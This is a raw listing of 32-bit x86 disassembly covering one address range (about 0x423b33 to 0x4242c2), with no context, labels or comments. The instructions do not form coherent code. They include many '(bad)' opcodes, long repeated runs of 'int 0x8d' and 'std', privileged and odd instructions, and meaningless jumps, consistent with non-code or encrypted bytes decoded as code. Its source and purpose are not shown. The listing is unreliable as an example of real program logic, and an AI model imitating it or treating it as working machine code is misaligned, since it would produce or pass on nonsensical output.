  423b33:	shr    edx,cl
  423b35:	sub    BYTE PTR [ebx+0x13],dl
  423b38:	jno    0x423b07
  423b3a:	lea    esi,[ebp+0x3bb596cd]
  423b40:	or     al,0x3b
  423b42:	cdq    
  423b43:	shr    ebx,cl
  423b45:	xchg   edx,eax
  423b46:	shr    edx,cl
  423b48:	sub    BYTE PTR [ebx+0x13],dl
  423b4b:	jno    0x423b4d
  423b4d:	(bad)  
  423b4e:	lods   eax,DWORD PTR ds:[esi]
  423b4f:	add    BYTE PTR [eax+0x1c],dh
  423b52:	int    0x76
  423b54:	std    
  423b55:	or     dh,BYTE PTR [esi+0x1d]
  423b58:	int    0x76
  423b5a:	jne    0x423b66
  423b5c:	out    0x55,al
  423b5e:	or     dh,BYTE PTR [esi-0x30]
  423b61:	leave  
  423b62:	jbe    0x423b01
  423b64:	inc    ecx
  423b65:	and    DWORD PTR [esi+0x5576cd35],eax
  423b6b:	int    0x8d
  423b6d:	push   ebp
  423b6e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b71:	or     al,0xd3
  423b73:	lods   eax,DWORD PTR ds:[esi]
  423b74:	sub    bl,dl
  423b76:	jmp    0x423b0a
  423b78:	push   ebx
  423b79:	ror    DWORD PTR [edx],cl
  423b7b:	jbe    0x423bc2
  423b7d:	int    0x76
  423b7f:	push   ebp
  423b80:	int    0x8d
  423b82:	push   ebp
  423b83:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b86:	or     al,0xd3
  423b88:	lods   eax,DWORD PTR ds:[esi]
  423b89:	sub    bl,dl
  423b8b:	jmp    0x423b1f
  423b8d:	push   ebx
  423b8e:	ror    DWORD PTR [edx],cl
  423b90:	jbe    0x423b9f
  423b92:	leave  
  423b93:	jbe    0x423b2a
  423b95:	dec    eax
  423b96:	and    DWORD PTR [esi-0x528936cb],eax
  423b9c:	ret    0x8621
  423b9f:	xor    eax,0xcd5576cd
  423ba4:	lea    edx,[ebp+0x3b]
  423ba7:	jns    0x423be4
  423ba9:	or     al,0xd3
  423bab:	jmp    0x423b3f
  423bad:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423bb3:	lea    ebx,ds:0x52f7d43
  423bb9:	push   ss
  423bba:	xchg   DWORD PTR [eax-0x6d241480],eax
  423bc0:	add    BYTE PTR [eax-0x326a7233],0x76
  423bc7:	xchg   ebp,eax
  423bc8:	int    0x96
  423bca:	inc    ebp
  423bcb:	cmp    eax,ebp
  423bcd:	cmp    ecx,DWORD PTR [edi]
  423bcf:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423bd5:	push   ebx
  423bd6:	jge    0x423ba5
  423bd8:	jbe    0x423bf7
  423bda:	xor    edx,edx
  423bdc:	cmp    ebx,edx
  423bde:	clc    
  423bdf:	add    cl,BYTE PTR [edx]
  423be1:	jbe    0x423bf0
  423be3:	int    0x76
  423be5:	lods   eax,DWORD PTR ds:[esi]
  423be6:	int    0x8d
  423be8:	lods   eax,DWORD PTR ds:[esi]
  423be9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bec:	or     al,0xd3
  423bee:	jmp    0x423b82
  423bf0:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423bf6:	lea    ecx,ds:0x16d87d43
  423bfc:	int    0x76
  423bfe:	lods   eax,DWORD PTR ds:[esi]
  423bff:	int    0x8d
  423c01:	lods   eax,DWORD PTR ds:[esi]
  423c02:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c05:	or     al,0xd3
  423c07:	lods   eax,DWORD PTR ds:[esi]
  423c08:	sub    bl,dl
  423c0a:	jmp    0x423b9e
  423c0c:	push   ebx
  423c0d:	ror    DWORD PTR [edx],cl
  423c0f:	jbe    0x423c1e
  423c11:	int    0x76
  423c13:	xchg   ebp,eax
  423c14:	int    0x8d
  423c16:	xchg   ebp,eax
  423c17:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c1a:	or     al,0xd3
  423c1c:	lods   eax,DWORD PTR ds:[esi]
  423c1d:	sub    bl,dl
  423c1f:	jmp    0x423bb3
  423c21:	push   ebx
  423c22:	ror    ebp,cl
  423c24:	lea    ecx,ds:0xad3d12f
  423c2a:	jbe    0x423c39
  423c2c:	int    0x76
  423c2e:	push   ebp
  423c2f:	int    0x8d
  423c31:	push   ebp
  423c32:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c35:	or     al,0xd3
  423c37:	jmp    0x423bcb
  423c39:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c3f:	lea    ecx,ds:0x52f7d43
  423c45:	pusha  
  423c46:	xchg   edx,eax
  423c47:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423c4e:	or     eax,0x874576cd
  423c53:	jbe    0x423c25
  423c55:	or     ah,dh
  423c57:	cmp    eax,0x5d5d760a
  423c5c:	inc    ecx
  423c5d:	and    DWORD PTR [esi+0x6d760a35],eax
  423c63:	leave  
  423c64:	jbe    0x423ccb
  423c66:	cmp    DWORD PTR [ecx],esp
  423c68:	xchg   BYTE PTR ds:0xb22576c9,dh
  423c6e:	and    DWORD PTR [esi-0xe89f5cb],eax
  423c74:	int    0x76
  423c76:	cmp    eax,0x3b3d8dcd
  423c7b:	jns    0x423cb8
  423c7d:	or     al,0xd3
  423c7f:	lods   eax,DWORD PTR ds:[esi]
  423c80:	sub    bl,dl
  423c82:	jmp    0x423c16
  423c84:	push   ebx
  423c85:	ror    DWORD PTR [edx],cl
  423c87:	jbe    0x423d06
  423c89:	int    0x6d
  423c8b:	jmp    0x423c93
  423c8d:	add    DWORD PTR [eax-0x36923280],0x8c06
  423c97:	add    BYTE PTR [ebx],cl
  423c99:	and    DWORD PTR [esi-0x369232cb],eax
  423c9f:	push   es
  423ca0:	jl     0x423ca2
  423ca2:	add    BYTE PTR [eax],al
  423ca4:	mul    DWORD PTR [ecx]
  423ca6:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423cac:	int    0x76
  423cae:	icebp  
  423caf:	int    0x8d
  423cb1:	icebp  
  423cb2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423cb5:	or     al,0xd3
  423cb7:	lods   eax,DWORD PTR ds:[esi]
  423cb8:	sub    bl,dl
  423cba:	jmp    0x423c4e
  423cbc:	push   ebx
  423cbd:	ror    ebp,cl
  423cbf:	lea    edi,[ebp+0x2f]
  423cc2:	rcl    ebx,1
  423cc4:	int    0x8d
  423cc6:	pop    ebp
  423cc7:	retf   0x8884
  423cca:	or     DWORD PTR [esi-0x1f],esi
  423ccd:	int    0x6d
  423ccf:	int    0x76
  423cd1:	icebp  
  423cd2:	int    0x8d
  423cd4:	icebp  
  423cd5:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423cd8:	jns    0x423cad
  423cda:	jmp    0x423c6e
  423cdc:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423ce2:	lea    edi,[ebp+0x2f]
  423ce5:	rcl    ebx,1
  423ce7:	int    0x8d
  423ce9:	gs int 0x96
  423cec:	cmp    ecx,DWORD PTR gs:[edi]
  423cef:	cmp    edx,ebp
  423cf1:	shl    edx,cl
  423cf3:	sub    bl,dl
  423cf5:	repz xchg edx,eax
  423cf7:	push   ebx
  423cf8:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423cfe:	das    
  423cff:	pop    ecx
  423d00:	dec    esp
  423d01:	mov    ch,cl
  423d03:	push   es
  423d04:	mov    WORD PTR [eax],es
  423d06:	add    BYTE PTR [eax],al
  423d08:	int    0x17
  423d0a:	mov    WORD PTR [eax],es
  423d0c:	add    BYTE PTR [eax],al
  423d0e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d11:	aad    0xd3
  423d13:	lods   eax,DWORD PTR ds:[esi]
  423d14:	sub    bl,dl
  423d16:	repz xchg edx,eax
  423d18:	push   ebx
  423d19:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d1f:	loope  0x423d5c
  423d21:	jge    0x423d2c
  423d23:	(bad)  
  423d24:	loope  0x423cf3
  423d26:	ins    DWORD PTR es:[edi],dx
  423d27:	retf   0xe176
  423d2a:	int    0x8d
  423d2c:	icebp  
  423d2d:	int    0x96
  423d2f:	icebp  
  423d30:	cmp    ecx,DWORD PTR [edi]
  423d32:	cmp    edx,ebp
  423d34:	shl    ebx,cl
  423d36:	xchg   edx,eax
  423d37:	shl    edx,cl
  423d39:	sub    BYTE PTR [ebx+0x13],dl
  423d3c:	int    0x96
  423d3e:	jge    0x423d6f
  423d40:	rcl    DWORD PTR [ebx],1
  423d42:	int    0x96
  423d44:	pop    ebp
  423d45:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423d4c:	icebp  
  423d4d:	int    0x8d
  423d4f:	icebp  
  423d50:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d53:	or     al,0xd3
  423d55:	lods   eax,DWORD PTR ds:[esi]
  423d56:	sub    bl,dl
  423d58:	jmp    0x423cec
  423d5a:	push   ebx
  423d5b:	ror    ebp,cl
  423d5d:	lea    edi,[ebp+0x2f]
  423d60:	rcl    ebx,1
  423d62:	int    0x8d
  423d64:	pop    ebp
  423d65:	retf   0x8884
  423d68:	or     DWORD PTR [esi-0x1f],esi
  423d6b:	int    0x6d
  423d6d:	int    0x76
  423d6f:	icebp  
  423d70:	int    0x8d
  423d72:	icebp  
  423d73:	cmp    edi,DWORD PTR [ecx-0x2d]
  423d76:	lods   eax,DWORD PTR ds:[esi]
  423d77:	sub    BYTE PTR [ebx],bh
  423d79:	or     al,0xd3
  423d7b:	jmp    0x423d0f
  423d7d:	push   ebx
  423d7e:	ror    ebp,cl
  423d80:	lea    edi,[ebp+0x2f]
  423d83:	rcl    ebx,1
  423d85:	int    0x8d
  423d87:	ins    DWORD PTR es:[edi],dx
  423d88:	int    0x96
  423d8a:	ins    DWORD PTR es:[edi],dx
  423d8b:	cmp    ecx,DWORD PTR [edi]
  423d8d:	cmp    edx,ebp
  423d8f:	shl    edx,cl
  423d91:	sub    bl,dl
  423d93:	repz xchg edx,eax
  423d95:	push   ebx
  423d96:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d9c:	das    
  423d9d:	pop    ecx
  423d9e:	dec    esp
  423d9f:	mov    ch,cl
  423da1:	push   es
  423da2:	jl     0x423da4
  423da4:	add    BYTE PTR [eax],al
  423da6:	int    0x17
  423da8:	jl     0x423daa
  423daa:	add    BYTE PTR [eax],al
  423dac:	cmp    edi,DWORD PTR [ecx+0x3b]
  423daf:	aad    0xd3
  423db1:	lods   eax,DWORD PTR ds:[esi]
  423db2:	sub    bl,dl
  423db4:	repz xchg edx,eax
  423db6:	push   ebx
  423db7:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423dbd:	loope  0x423dfa
  423dbf:	jge    0x423dca
  423dc1:	(bad)  
  423dc2:	loope  0x423d91
  423dc4:	ins    DWORD PTR es:[edi],dx
  423dc5:	retf   0xe176
  423dc8:	int    0x8d
  423dca:	icebp  
  423dcb:	int    0x96
  423dcd:	icebp  
  423dce:	cmp    ecx,DWORD PTR [edi]
  423dd0:	cmp    edx,ebp
  423dd2:	shl    ebx,cl
  423dd4:	xchg   edx,eax
  423dd5:	shl    edx,cl
  423dd7:	sub    BYTE PTR [ebx+0x13],dl
  423dda:	int    0x96
  423ddc:	jge    0x423e0d
  423dde:	rcl    DWORD PTR [ebx],1
  423de0:	int    0x96
  423de2:	pop    ebp
  423de3:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423dea:	and    eax,0x3b258dcd
  423def:	or     al,0x3b
  423df1:	jns    0x423dc6
  423df3:	jmp    0x423d87
  423df5:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423dfb:	lea    ebp,[ebp-0x33]
  423dfe:	xchg   esi,eax
  423dff:	ins    DWORD PTR es:[edi],dx
  423e00:	cmp    ecx,DWORD PTR [edi]
  423e02:	cmp    edx,ebp
  423e04:	shl    edx,cl
  423e06:	sub    bl,dl
  423e08:	repz xchg edx,eax
  423e0a:	push   ebx
  423e0b:	adc    ebp,DWORD PTR [edi]
  423e0d:	rcl    ebx,1
  423e0f:	xchg   DWORD PTR [esi+0x7d],esi
  423e12:	or     dh,BYTE PTR [esi+0x7d]
  423e15:	int    0x76
  423e17:	jge    0x423de6
  423e19:	lea    ecx,ds:0xb2f7d43
  423e1f:	(bad)  
  423e20:	inc    DWORD PTR [eax]
  423e22:	add    ch,cl
  423e24:	jbe    0x423e93
  423e26:	int    0x8d
  423e28:	ins    DWORD PTR es:[edi],dx
  423e29:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e2c:	jmp    0x423dc0
  423e2e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e31:	lods   eax,DWORD PTR ds:[esi]
  423e32:	sub    BYTE PTR [ebx-0x2d],dl
  423e35:	int    0x8d
  423e37:	or     eax,0xcdd3d12f
  423e3c:	lea    edi,ds:0xf2d30f3b
  423e42:	sub    BYTE PTR [ebx-0x2d],dl
  423e45:	int    0x8d
  423e47:	cmp    eax,0xebd30c3b
  423e4c:	xchg   edx,eax
  423e4d:	push   ebx
  423e4e:	ror    DWORD PTR [edx],cl
  423e50:	jbe    0x423eb7
  423e52:	int    0x76
  423e54:	popf   
  423e55:	int    0x8d
  423e57:	popf   
  423e58:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e5b:	jmp    0x423def
  423e5d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e60:	lods   eax,DWORD PTR ds:[esi]
  423e61:	sub    BYTE PTR [ebx-0x2d],dl
  423e64:	int    0x8d
  423e66:	popf   
  423e67:	int    0x96
  423e69:	popf   
  423e6a:	cmp    ecx,DWORD PTR [edi]
  423e6c:	shl    edx,cl
  423e6e:	sub    BYTE PTR [ebx],bh
  423e70:	aad    0xd3
  423e72:	repz xchg edx,eax
  423e74:	push   ebx
  423e75:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423e7b:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423e81:	in     al,dx
  423e82:	sbb    al,0xcd
  423e84:	jbe    0x423e23
  423e86:	int    0x8d
  423e88:	popf   
  423e89:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e8c:	or     al,0xd3
  423e8e:	lods   eax,DWORD PTR ds:[esi]
  423e8f:	sub    bl,dl
  423e91:	jmp    0x423e25
  423e93:	push   ebx
  423e94:	rol    DWORD PTR [edi+0x760a4576],cl
  423e9a:	inc    ebp
  423e9b:	int    0x76
  423e9d:	popf   
  423e9e:	int    0x8d
  423ea0:	popf   
  423ea1:	cmp    edi,DWORD PTR [ecx-0x2d]
  423ea4:	lods   eax,DWORD PTR ds:[esi]
  423ea5:	sub    BYTE PTR [ebx],bh
  423ea7:	or     al,0xd3
  423ea9:	jmp    0x423e3d
  423eab:	push   ebx
  423eac:	ror    ebp,cl
  423eae:	lea    ebx,ds:0x76cd7d33
  423eb4:	popf   
  423eb5:	int    0x96
  423eb7:	popf   
  423eb8:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ebb:	aad    0xd3
  423ebd:	repz xchg edx,eax
  423ebf:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423ec5:	xchg   esi,eax
  423ec6:	inc    ebp
  423ec7:	das    
  423ec8:	rcl    edx,1
  423eca:	inc    ebx
  423ecb:	shr    DWORD PTR [edi],cl
  423ecd:	pop    es
  423ece:	adc    ebp,edi
  423ed0:	add    BYTE PTR [eax],al
  423ed2:	int    0x76
  423ed4:	mov    BYTE PTR [eax],al
  423ed6:	(bad)  
  423ed7:	dec    esp
  423ed8:	iret   
  423ed9:	jbe    0x423e98
  423edb:	add    dh,dl
  423edd:	mov    BYTE PTR [eax-0x33],dh
  423ee0:	jbe    0x423e6a
  423ee2:	int    0x1
  423ee4:	xchg   ebp,eax
  423ee5:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423eef:	icebp  
  423ef0:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423efa:	jne    0x423eb9
  423efc:	test   al,0x88
  423efe:	add    BYTE PTR [eax-0x322f89f6],0x76
  423f05:	stc    
  423f06:	int    0x8d
  423f08:	stc    
  423f09:	cmp    eax,ebp
  423f0b:	cmp    ecx,DWORD PTR [edi]
  423f0d:	shl    edx,cl
  423f0f:	sub    bl,dl
  423f11:	mov    ebp,0xcdd35392
  423f16:	lea    esi,[ebp+0x43]
  423f19:	rcl    esp,cl
  423f1b:	push   esi
  423f1c:	int    0x76
  423f1e:	mov    ch,cl
  423f20:	lea    ebp,ds:0xcd2d96cd
  423f26:	add    DWORD PTR [ecx],edx
  423f28:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f32:	shr    edx,cl
  423f34:	sub    BYTE PTR [ebx+0x13],dl
  423f37:	jno    0x423f06
  423f39:	(bad)  
  423f3a:	stc    
  423f3b:	int    0x96
  423f3d:	stc    
  423f3e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423f41:	cdq    
  423f42:	shr    ebx,cl
  423f44:	xchg   edx,eax
  423f45:	shr    edx,cl
  423f47:	sub    BYTE PTR [ebx+0x13],dl
  423f4a:	jno    0x423f4c
  423f4c:	(bad)  
  423f4d:	jne    0x423f4f
  423f4f:	jo     0x423f6d
  423f51:	stos   BYTE PTR es:[edi],al
  423f52:	test   al,0x63
  423f54:	retf   
  423f55:	ror    BYTE PTR [eax-0x12326980],cl
  423f5b:	add    al,0xed
  423f5d:	and    al,0x98
  423f5f:	int    0x11
  423f61:	int    0x12
  423f63:	sub    eax,0x4808081
  423f68:	pop    esp
  423f69:	sub    BYTE PTR [edi],0x5
  423f6c:	dec    edx
  423f6d:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423f77:	add    BYTE PTR [esi],0xf7
  423f7a:	das    
  423f7b:	add    eax,0x80808003
  423f80:	int    0x7
  423f82:	or     DWORD PTR [eax+0x6d068080],eax
  423f88:	das    
  423f89:	add    eax,0x808080e9
  423f8e:	add    al,0x69
  423f90:	int3   
  423f91:	add    BYTE PTR [eax+0x52f3080],0xe2
  423f98:	add    BYTE PTR [eax+0x54985e80],0x2f
  423f9f:	add    eax,0x808080e3
  423fa4:	int    0xc1
  423fa6:	and    eax,0x4808081
  423fab:	mov    dh,0x11
  423fad:	or     ch,0x13
  423fb0:	xor    ecx,DWORD PTR [esi-0x79]
  423fb3:	shr    BYTE PTR [edi],cl
  423fb5:	mov    ebx,0x8d0a4c70
  423fba:	mov    ch,0x2f
  423fbc:	mov    ebx,0x13874e7c
  423fc1:	das    
  423fc2:	add    eax,0x80808049
  423fc7:	iret   
  423fc8:	jl     0x423fde
  423fca:	pop    ebx
  423fcb:	or     cl,BYTE PTR [ebp+0x69bd]
  423fd1:	add    BYTE PTR [ebx-0x2baef966],al
  423fd7:	or     ebp,0x31
  423fda:	add    al,0xb6
  423fdc:	cmc    
  423fdd:	sub    BYTE PTR [ebx],0x99
  423fe0:	xchg   ecx,esi
  423fe2:	das    
  423fe3:	mov    ebx,0xbb2f4ee0
  423fe8:	mov    al,ds:0xd4fc874c
  423fed:	mov    esi,0xa148acf
  423ff2:	(bad)  
  423ff3:	in     eax,dx
  423ff4:	push   es
  423ff5:	push   ecx
  423ff6:	aam    0x6e
  423ff8:	int    0x89
  423ffa:	add    al,0xb6
  423ffc:	stc    
  423ffd:	sub    BYTE PTR [ebx],0xf
  424000:	xchg   DWORD PTR [ebp+0x2f],edi
  424003:	mov    ebx,0xbb2f4ede
  424008:	sahf   
  424009:	dec    esp
  42400a:	xchg   esp,edi
  42400c:	aam    0x33
  42400e:	iret   
  42400f:	ficom  WORD PTR [edx+ecx*1]
  424012:	out    0xfd,al
  424014:	int    0xe6
  424016:	std    
  424017:	int    0x6a
  424019:	push   es
  42401a:	add    ah,dl
  42401c:	xchg   ch,cl
  42401e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42401f:	mov    ch,0x81
  424021:	and    al,0x8b
  424023:	das    
  424024:	mov    ebx,0xbb2f4ede
  424029:	sahf   
  42402a:	dec    esp
  42402b:	add    BYTE PTR [esi-0x7],dh
  42402e:	add    al,0x76
  424030:	std    
  424031:	mov    BYTE PTR [edi-0x619a104],al
  424037:	sbb    ch,0x2f
  42403a:	mov    ebx,0xbb2f4ee0
  42403f:	mov    al,ds:0xed8dcd4c
  424044:	add    BYTE PTR [esi-0xb],dh
  424047:	add    al,0xd3
  424049:	mov    BYTE PTR [edi-0x1272f504],al
  42404f:	pop    esi
  424050:	out    0xf5,al
  424052:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  424059:	jo     0x4240a9
  42405b:	das    
  42405c:	mov    ebx,0x76004cdc
  424061:	adc    DWORD PTR [ebx+edx*8],eax
  424064:	mov    BYTE PTR [edi-0x4272f527],al
  42406a:	pop    esi
  42406b:	xchg   esi,eax
  42406c:	adc    DWORD PTR [edi],ebp
  42406e:	or     ebp,DWORD PTR [esi-0x56000000]
  424074:	arpl   WORD PTR [ebx],di
  424076:	ins    DWORD PTR es:[edi],dx
  424077:	ins    BYTE PTR es:[edi],dx
  424078:	in     al,dx
  424079:	xchg   edx,eax
  42407a:	cmp    ebp,DWORD PTR [ebp-0x58]
  42407d:	retf   
  42407e:	lds    edx,FWORD PTR [esi+0xacdedcd]
  424084:	sub    eax,0xcd808081
  424089:	jbe    0x4240d7
  42408b:	add    al,0xed
  42408d:	xor    BYTE PTR [ebx+0x3b],bl
  424090:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  424096:	add    eax,0x8080800b
  42409b:	inc    ebx
  42409c:	(bad)
  42409f:	pop    esi
  4240a0:	pushf  
  4240a1:	(bad)  
  4240a3:	test   DWORD PTR [ebx],edi
  4240a5:	ins    DWORD PTR es:[edi],dx
  4240a6:	ins    BYTE PTR es:[edi],dx
  4240a7:	in     al,dx
  4240a8:	fmul   st,st(5)
  4240aa:	ins    BYTE PTR es:[edi],dx
  4240ab:	fadd   QWORD PTR [edi+0x7ccd8876]
  4240b1:	and    al,0xcd
  4240b3:	jo     0x4240e9
  4240b5:	int    0x90
  4240b7:	adc    al,0xcd
  4240b9:	fcomp  QWORD PTR [edi+eax*4]
  4240bc:	lea    ecx,[eax+0xa889687]
  4240c2:	(bad)  
  4240c3:	std    
  4240c4:	inc    ebx
  4240c5:	clc    
  4240c6:	jnp    0x42404f
  4240c8:	or     ah,dh
  4240ca:	std    
  4240cb:	or     ah,BYTE PTR [esi-0x259a107]
  4240d1:	fsub   st,st(3)
  4240d3:	inc    ebx
  4240d4:	pushf  
  4240d5:	adc    al,0x77
  4240d7:	xchg   BYTE PTR [edi],ch
  4240d9:	mov    ebx,0x92eca054
  4240de:	int    0xf4
  4240e0:	iret   
  4240e1:	push   esp
  4240e2:	ror    ebp,0x68
  4240e5:	push   es
  4240e6:	add    ah,dl
  4240e8:	ds xchg esi,esp
  4240eb:	mov    BYTE PTR [edx],cl
  4240ed:	out    0x11,al
  4240ef:	inc    ebx
  4240f0:	stc    
  4240f1:	fdiv   DWORD PTR [eax]
  4240f3:	int    0xa6
  4240f5:	dec    esp
  4240f6:	int    0x63
  4240f8:	in     al,0x87
  4240fa:	popf   
  4240fb:	inc    ebx
  4240fc:	cld    
  4240fd:	ja     0x424083
  4240ff:	int    0x58
  424101:	in     al,dx
  424102:	mov    BYTE PTR [ebx],dh
  424104:	out    0x88,al
  424106:	or     ch,BYTE PTR [eax-0x33]
  424109:	(bad)  
  42410a:	adc    DWORD PTR [esi],eax
  42410c:	not    esp
  42410e:	dec    esi
  42410f:	int    0xa6
  424111:	stc    
  424112:	dec    ebx
  424113:	or     ah,BYTE PTR [esi-0x259bc07]
  424119:	sbb    BYTE PTR [ebp-0x14],0x8
  42411d:	cmp    ebp,DWORD PTR [ebp-0x56]
  424120:	test   al,0x63
  424122:	retf   
  424123:	ror    BYTE PTR [eax-0x12326980],cl
  424129:	add    al,0xed
  42412b:	push   eax
  42412c:	pop    ebx
  42412d:	cwde   
  42412e:	pop    ebp
  42412f:	dec    ecx
  424130:	and    DWORD PTR [esi-0x289f5cb],eax
  424136:	leave  
  424137:	jbe    0x424132
  424139:	inc    ecx
  42413a:	and    DWORD PTR [esi-0x27232cb],eax
  424140:	int    0xa6
  424142:	std    
  424143:	call   0x3b81:0x90cfffc0
  42414a:	psrlq  mm5,mm3
  42414d:	xchg   edx,eax
  42414e:	stos   BYTE PTR es:[edi],al
  42414f:	cmp    esp,ecx
  424151:	shl    ebp,cl
  424153:	sub    BYTE PTR [ebx+0xc],dl
  424156:	or     cl,BYTE PTR [ebp-0x2723243]
  42415c:	int    0x8d
  42415e:	std    
  42415f:	int    0x8d
  424161:	std    
  424162:	int    0x8d
  424164:	std    
  424165:	int    0x8d
  424167:	std    
  424168:	int    0x8d
  42416a:	std    
  42416b:	int    0x8d
  42416d:	std    
  42416e:	int    0x8d
  424170:	std    
  424171:	int    0x8d
  424173:	std    
  424174:	int    0x8d
  424176:	std    
  424177:	leave  
  424178:	jbe    0x42418b
  42417a:	fadd   st,st(5)
  42417c:	loope  0x4241d3
  42417e:	int    0x8d
  424180:	std    
  424181:	int    0xa6
  424183:	std    
  424184:	cmp    esp,ecx
  424186:	cmp    ecx,DWORD PTR [edi]
  424188:	shl    ebp,cl
  42418a:	sub    bl,dl
  42418c:	jmp    0x424120
  42418e:	push   ebx
  42418f:	or     al,0xcd
  424191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424192:	dec    esp
  424193:	int    0x9f
  424195:	sub    eax,0x43808081
  42419a:	push   ebx
  42419b:	das    
  42419c:	add    eax,0x80808717
  4241a1:	int    0x8d
  4241a3:	std    
  4241a4:	int    0xa6
  4241a6:	std    
  4241a7:	cmp    ecx,DWORD PTR [edi]
  4241a9:	cmp    esp,ecx
  4241ab:	shr    ebx,cl
  4241ad:	xchg   edx,eax
  4241ae:	shl    ebp,cl
  4241b0:	sub    BYTE PTR [ebx+0xc],dl
  4241b3:	inc    ebx
  4241b4:	adc    ebp,DWORD PTR [edi]
  4241b6:	add    eax,0x8080877f
  4241bb:	int    0xca
  4241bd:	add    DWORD PTR [eax-0x69327f80],eax
  4241c3:	std    
  4241c4:	int    0xa6
  4241c6:	std    
  4241c7:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  4241cd:	xchg   edx,eax
  4241ce:	shl    ebp,cl
  4241d0:	sub    BYTE PTR [ebx-0x2b],dl
  4241d3:	inc    ebx
  4241d4:	adc    ebp,DWORD PTR [edi]
  4241d6:	add    eax,0x8080875b
  4241db:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  4241e1:	int    0xf1
  4241e3:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  4241e9:	shl    ebx,cl
  4241eb:	xchg   edx,eax
  4241ec:	shl    ebp,cl
  4241ee:	sub    BYTE PTR [ebx-0x2b],dl
  4241f1:	or     dl,BYTE PTR [esi+0x1196cd11]
  4241f7:	inc    ebx
  4241f8:	icebp  
  4241f9:	aam    0x26
  4241fb:	int    0x76
  4241fd:	std    
  4241fe:	int    0x96
  424200:	std    
  424201:	cmp    ebx,ecx
  424203:	cmp    edi,DWORD PTR [ecx-0x2d]
  424206:	jmp    0xd253:0x92bdd328
  42420d:	int    0x96
  42420f:	adc    DWORD PTR [ebx-0x26],esi
  424212:	adc    al,0x5e
  424214:	test   BYTE PTR [edx-0x2a],cl
  424217:	xor    cl,ch
  424219:	jbe    0x424218
  42421b:	int    0x96
  42421d:	std    
  42421e:	cmp    ebx,ecx
  424220:	cmp    edi,DWORD PTR [ecx-0x2d]
  424223:	jmp    0xd253:0x92bdd328
  42422a:	int    0x96
  42422c:	adc    DWORD PTR [ebx-0x26],esi
  42422f:	adc    al,0x5e
  424231:	je     0x42427d
  424233:	xor    BYTE PTR [edi],ch
  424235:	add    eax,0x808092df
  42423a:	int    0x76
  42423c:	std    
  42423d:	int    0x76
  42423f:	std    
  424240:	int    0xa6
  424242:	std    
  424243:	int    0x76
  424245:	std    
  424246:	cmp    ecx,ecx
  424248:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  42424e:	in     al,dx
  42424f:	xchg   edx,eax
  424250:	push   ebx
  424251:	popf   
  424252:	int    0x76
  424254:	adc    DWORD PTR [ebx+0x6d],esi
  424257:	adc    al,0x87
  424259:	ror    ebp,cl
  42425b:	jl     0x42428d
  42425d:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  424263:	int    0x8d
  424265:	std    
  424266:	int    0x96
  424268:	std    
  424269:	cmp    ecx,DWORD PTR [edi]
  42426b:	cmp    ebx,ecx
  42426d:	shr    ebx,cl
  42426f:	xchg   edx,eax
  424270:	shr    edx,cl
  424272:	sub    BYTE PTR [ebx+0x13],dl
  424275:	int    0x96
  424277:	std    
  424278:	or     cl,BYTE PTR [ebp+0xa88cd95]
  42427e:	lea    esi,[ebp+0x3bfd8dcd]
  424284:	cdq    
  424285:	cmp    esi,eax
  424287:	shl    edx,cl
  424289:	sub    bl,dl
  42428b:	repz xchg edx,eax
  42428d:	push   ebx
  42428e:	jecxz  0x42425d
  424290:	lea    esi,[ebp-0x792becbd]
  424296:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  42429c:	int    0x8d
  42429e:	std    
  42429f:	int    0x96
  4242a1:	std    
  4242a2:	cmp    ecx,DWORD PTR [edi]
  4242a4:	cmp    ebx,ecx
  4242a6:	shr    ebx,cl
  4242a8:	xchg   edx,eax
  4242a9:	shr    edx,cl
  4242ab:	sub    BYTE PTR [ebx+0x13],dl
  4242ae:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  4242b2:	jbe    0x424251
  4242b4:	popa   
  4242b5:	and    DWORD PTR [esi-0x777278cb],eax
  4242bb:	or     cl,BYTE PTR [ebp-0x32781313]
  4242c1:	(bad)  
  4242c2:	in     eax,dx
